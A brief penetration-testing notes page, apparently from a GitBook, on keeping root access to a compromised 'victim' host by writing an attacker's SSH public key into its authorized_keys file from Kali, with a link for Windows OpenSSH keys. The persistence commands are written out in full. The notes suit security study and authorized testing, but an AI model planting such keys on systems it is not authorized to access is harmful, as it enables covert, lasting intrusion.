---
description: >-
  with root access, we can create authorized_keys file on victim /root/.ssh for
  persisting root access from kali
---

# persisting ssh login with ssh-keygen

{% code overflow="wrap" %}
```
kali:
ssh-keygen
cat ~/.ssh/id_rsa.pub

victim:
(mkdir /user/.ssh)
echo "{id_rsa.pub}" > /user/.ssh/authorized_keys

ssh user@victim

(user <-> root)
```
{% endcode %}

#### windows (admin ps, need know password)

{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement" %}
